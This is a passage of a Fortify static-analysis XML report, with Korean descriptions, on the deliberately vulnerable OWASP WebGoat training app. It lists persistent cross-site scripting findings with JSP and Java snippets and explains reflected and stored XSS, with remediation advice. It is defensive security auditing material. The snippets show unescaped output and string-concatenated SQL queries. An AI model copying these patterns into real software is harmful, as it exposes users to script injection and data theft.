					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D2CC7F3BC3A188C27D8B41E2B34AD07E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 53 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DF543B69D77CE210483F9F9C58BAE902" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 66 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0C3D2371B16094B117F1B27492A44CAE" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="65B404D5E5CE1DFCBD558D59EBD19E20" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A0CAF1FA0EC4EFB07DB0AC931F6E29F7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress1()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1813180600A6B048C0B330E2CF9D0D16" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6F5DF0744EBB66AAB881DBFACA12F55E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1FC7D0FF1DD047EF4F31A1DE65F7CF51" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="589FDC549185A2D6CE7566CA1F2FB157" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 95 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>95</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="20BCD43A1397F1C3894166B841A7647A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F857024D9B1E7B4A5D5E628D3E74F16A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="62ED8C9C307792437528DDF9090EB14A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="242">
                        <groupTitle>Cross-Site Scripting: Reflected</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>AbstractLesson.java의 getSource() 메서드가 688 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>XSS(Cross-site scripting) 취약점은 다음 경우에 발생합니다.

1. 신뢰할 수 없는 소스를 통해 데이터가 웹 응용 프로그램에 입력됩니다. Reflected XSS의 경우 신뢰할 수 없는 소스는 일반적으로 웹 요청이지만, Persisted(Stored 라고도 함) XSS의 경우에는 일반적으로 데이터베이스 또는 다른 백엔드 데이터 저장소입니다.


2. 데이터는 검증 없이 웹 사용자에게 전달된 동적 콘텐트에 포함됩니다.

웹 브라우저에 전달되는 악성 콘텐트는 흔히 JavaScript 세그먼트의 형태를 취하지만 HTML, Flash 또는 기타 브라우저가 실행하는 다른 모든 유형의 코드를 포함할 수도 있습니다. XSS 기반의 공격은 거의 무제한으로 다양하지만, 흔히 쿠키 또는 기타 세션 정보와 같은 개인 데이터를 공격자에게 전송하여 피해자를 공격자가 제어하는 웹 콘텐트에 리디렉션하거나 피해 사이트로 위장하고 사용자 컴퓨터에 기타 악의적인 작업을 수행하는 것이 공통적인 수법입니다.


예제 1: 다음 JSP 코드 세그먼트는 HTTP 요청에서 직원 ID인 eid를 읽어 사용자에게 표시합니다.


&lt;% String eid = request.getParameter("eid"); %&gt;
...
Employee ID: &lt;%= eid %&gt;



다음 예제의 코드는 eid에 표준 영숫자 텍스트만 있으면 올바로 동작합니다. eid가 메타 문자나 소스 코드가 포함된 값을 갖는 경우, 웹 브라우저가 HTTP 응답을 표시할 때 코드를 실행합니다.

처음에는 이것이 큰 취약점으로 보이지 않을 수도 있습니다. 결국 누군가 URL을 입력하여 자신의 컴퓨터에서 악성 코드가 실행되게 하는 이유는 무엇입니까? 정말 위험한 일은 공격자가 악성 URL을 만든 다음 전자 메일 또는 사회 공학 속임수를 사용하여 피해자가 URL의 링크를 방문하도록 만드는 것입니다. 피해자가 링크를 클릭하면 모르는 사이에 취약한 웹 응용 프로그램을 통해 해로운 내용을 본인의 컴퓨터로 전달하게 됩니다. 취약한 웹 응용 프로그램을 익스플로이트하는 메커니즘을 Reflected XSS 라고 합니다.


예제 2: 다음 JSP 코드 세그먼트는 지정된 직원 ID의 직원에 대한 데이터베이스를 쿼리하여 해당 직원의 이름을 인쇄합니다.


&lt;%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
   rs.next();
   String name = rs.getString("name");
}
%&gt;

Employee Name: &lt;%= name %&gt;



Example 1에서처럼 이 코드는 name의 값이 올바로 동작할 때는 정확하게 기능을 하지만 그렇지 않을 때는 익스플로이트를 방지하기 위한 아무 조치도 취하지 않습니다. 이 코드는 name의 값을 분명하게 응용 프로그램이 콘텐트를 관리하는 데이터베이스에서 읽기 때문에 위험하지 않은 것으로 보일 수 있습니다. 하지만 name의 값이 사용자가 제공하는 데이터에서 오는 경우 데이터베이스는 악성 콘텐트의 통로가 될 수 있습니다. 데이터베이스에 저장된 모든 데이터에 대한 적절한 입력값 검증 절차가 없으면 공격자는 사용자의 웹 브라우저에서 악의적인 명령을 실행할 수 있습니다. 이런 유형의 익스플로이트를 Persistent(또는 Stored) XSS라고 하는데 데이터 저장소가 사용하는 간접 참조 때문에 위협을 식별하기 어렵고 공격이 여러 사용자에게 가해질 가능성이 커지기 때문에 더욱 위험합니다. XSS는 방문자에게 "방명록"을 제공하는 웹 사이트에서 이런 형태로 시작되었습니다. 공격자가 방명록 항목에 JavaScript를 삽입하면 이후에 방명록 페이지를 방문하는 방문자는 모두 악성 코드를 실행하게 됩니다.

모바일 환경에서는 Cross-Site Scripting과 같은 전형적인 웹 응용 프로그램 취약성이 발생하지 않는다고 생각하는 사용자도 있습니다. 자기 자신을 공격하는 사용자는 없을 것이라 여기기 때문입니다. 그러나 모바일 플랫폼의 핵심 요소는 다양한 소스에서 다운로드되어 같은 장치에서 함께 실행되는 응용 프로그램이라는 점을 유념해야 합니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 프로세스 간 통신을 포함하도록 모바일 응용 프로그램의 공격 표면을 확장해야 합니다.

예제 3: 다음 코드는 Android의 WebView에서 JavaScript를 활성화(기본적으로 JavaScript는 비활성화됨)하고 Android 인텐트에서 받은 값을 기준으로 페이지를 로드합니다.


...
        WebView webview = (WebView) findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        String url = this.getIntent().getExtras().getString("url");
        webview.loadUrl(url);
...


url 값이 javascript:로 시작하면 그 뒤에 오는 JavaScript 코드가 WebView 내에 있는 웹 페이지의 컨텍스트에서 실행됩니다.

예제에서처럼, XSS 취약점은 HTTP 응답에 확인되지 않은 데이터가 포함된 코드 때문에 발생합니다. XSS 공격이 피해자에게 가해지는 방식은 세 가지가 있습니다.

- Example 1에서처럼 데이터를 HTTP 요청에서 직접 읽어 들여 HTTP 응답에 다시 적용하는 것입니다. 적용된 XSS 익스플로이트는 공격자가 사용자로 하여금 위험한 콘텐트를 취약한 웹 응용 프로그램에 제공하도록 만드는 것입니다. 이 위험한 콘텐트는 다시 사용자에게 돌아가고 웹 브라우저가 이를 실행합니다. 악성 콘텐트를 제공하는 가장 일반적인 메커니즘은 콘텐트를 공용으로 게시하거나 피해자에게 직접 전자 메일로 보내지는 URL의 매개 변수로 포함하는 것입니다. 이런 식으로 생성된 URL은 많은 공격자가 피해자를 속여 피해 사이트를 참조하는 URL을 방문하게 하는 피싱 기법의 근간을 이룹니다. 사이트가 공격자의 콘텐트를 사용자에게 보내면, 콘텐트가 실행되고 세션 정보가 들어있는 쿠키 등의 개인 정보가 사용자의 컴퓨터에서 공격자에게 전송되거나 다른 악의적인 작업이 수행됩니다.

- Example 2에서처럼 응용 프로그램은 데이터베이스 또는 다른 신뢰할 수 있는 데이터 저장소에 데이터를 저장합니다. 그러면 위험한 데이터는 응용 프로그램이 다시 읽어 들여 동적 콘텐트에 포함시킵니다. Persistent XSS 익스플로이트는 공격자가 위험한 콘텐트를 데이터 저장소에 삽입하고 이 콘텐트를 나중에 읽어 들여 동적 콘텐트에 포함시킬 때 발생합니다. 공격자의 관점에서 악성 콘텐트를 삽입할 최적의 장소는 많은 사용자나 특히 관련 사용자에게 표시되는 장소입니다. 일반적으로 관련 사용자는 응용 프로그램에 권한을 높이거나 공격자가 원하는 민감한 데이터와 상호 작용합니다. 이런 사용자가 악성 콘텐트를 실행하면 공격자는 사용자 대신 권한 있는 작업을 실행하거나 사용자 소유의 민감한 데이터에 접근할 수 있습니다.

- Example 3과 같이 응용 프로그램 외부의 소스에서 데이터베이스 또는 기타 데이터 저장소에 위험한 데이터를 저장하고 위험한 데이터를 응용 프로그램이 신뢰할 수 있는 데이터로 읽어 들여 데이터가 동적 콘텐트에 포함됩니다.


많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>XSS 방지를 위한 해결 방법은 필요한 위치에서 유효성 검사가 수행되도록 하고 취약성을 방지하도록 관련 속성을 설정하는 것입니다.

XSS 취약점은 응용 프로그램이 출력에 악성 데이터를 포함할 때 발생하기 때문에 한 가지 논리적인 접근 방식은 데이터가 응용 프로그램을 벗어나기 직전에 데이터를 확인하는 것입니다. 하지만 웹 응용 프로그램에 동적 콘텐트 생성을 위한 복잡하고 까다로운 코드가 있기 때문에 이 방법은 생략(검증 누락) 오류가 발생할 가능성이 큽니다. 이런 위험을 완화하는 효과적인 방법 역시 XSS의 입력값 검증을 수행하는 것입니다.

웹 응용 프로그램은 SQL injection과 같은 다른 취약점을 방지하기 위해 모든 입력을 확인해야 합니다. 따라서 응용 프로그램의 기존 입력값 검증 메커니즘에 XSS 검사를 포함하도록 확대하는 것이 비교적 쉽습니다. XSS의 입력값 검증이 아무리 뛰어나더라도 엄격한 출력 검증을 대신할 수는 없습니다. 응용 프로그램은 공유 데이터 저장소 또는 기타 신뢰할 수 있는 소스를 통해 입력을 받는데 그 데이터 저장소가 적절한 입력값 검증을 수행하지 않는 소스에서 입력을 받을 수 있습니다. 따라서 응용 프로그램은 어떤 경우에도 이런 저런 데이터의 안전을 신뢰할 수 없습니다. 즉, XSS 취약점을 예방하는 최선의 방법은 응용 프로그램에 들어가고 응용 프로그램에서 사용자에게 전달되는 입력을 모두 확인하는 것입니다.

가장 안전한 XSS 검증 방법은 HTTP 컨텐츠에 사용할 수 있는 안전한 문자의 허용 목록을 만들어 이 승인된 집합의 문자만으로 이루어진 입력만 받는 것입니다. 예를 들어, 올바른 사용자 이름은 영숫자만 포함하거나 전화 번호는 숫자 0-9만 포함하도록 합니다. 하지만 이 방법은 문자를 인코딩한 후 브라우저에 특별한 의미가 있는 많은 문자를 올바른 입력으로 간주해야 하는 웹 응용 프로그램에서는 실효성이 떨어집니다. 그 예로 사용자로부터 HTML 코드를 입력받아야 하는 웹 디자인 게시판을 들 수 있습니다.

보다 유연하지만 안전성이 떨어지는 접근 방식은 거부 목록을 구현하는 것입니다. 거부 목록 방식은 입력을 사용하기 전에 위험한 문자를 선별적으로 거부하거나 이스케이프 처리합니다. 리스트를 만들려면 먼저 웹 브라우저에 특별한 의미가 있는 문자 집합을 이해해야 합니다. HTML 표준에 특별한 의미가 있는 문자가 정의되어 있는데도 많은 웹 브라우저가 HTML에서 흔히 발생하는 실수를 수정하려고 하고 다른 문자를 상황에 따라 특별한 의미로 처리할 수 있습니다. 그러므로 거부 목록을 사용하여 XSS를 방지하지 않는 것이 좋습니다. 카네기 멜론 대학 SEI(Software Engineering Institute)의 CERT(R) Coordination Center에서는 다음과 같이 여러 상황에서 특수 문자에 대한 세부 정보를 제공합니다[1].

Block-level element 항목(텍스트 단락 중간):

- "&lt;"는 태그가 시작되는 표시이기 때문에 특수합니다.

- "&amp;"는 문자 엔터티가 시작되는 표시이기 때문에 특수합니다.

- "&gt;"는 일부 브라우저에서 페이지 작성자가 여는 "&lt;"를 포함할 계획이었지만 실수로 누락했다는 가정하에 특수하게 처리되기 때문에 특수합니다.

